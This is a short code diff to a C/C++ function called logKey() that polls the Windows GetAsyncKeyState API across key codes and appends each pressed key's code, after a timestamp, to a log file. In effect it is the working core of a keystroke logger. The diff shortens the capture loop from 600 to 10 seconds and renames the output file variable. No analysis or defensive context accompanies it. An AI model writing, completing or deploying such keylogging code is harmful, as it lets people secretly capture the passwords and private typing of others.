@@ -17,7 +17,7 @@ char * logKey() {
 
     time_t date = time(NULL);
     fprintf(file, "0\n%s\t", ctime(&date));
-    fclose(file);
+	fclose(file);
 
     unsigned short ch=0, i=0;
 
@@ -27,16 +27,15 @@ char * logKey() {
     end = time(NULL);
 
 
-    while ( difftime(end, start) <= 600.0 ) {
+    while ( difftime(end, start) <= 10.0 ) {
         ch = 1;
-
         while ( ch < 250 ) {
             for ( i = 0; i < 50; i++, ch++ ) {
                 if ( GetAsyncKeyState(ch) == -32767 ) {
 					cout << ch;
-                    file = fopen(FILE_NAME, "a");
-                    fprintf(file, "%d", ch);
-                    fclose(file);
+                    file = fopen(file_name, "a");
+                    fprintf(file, "%d", (int)ch);
+					fclose(file);
                 }
             }
             Sleep(1);
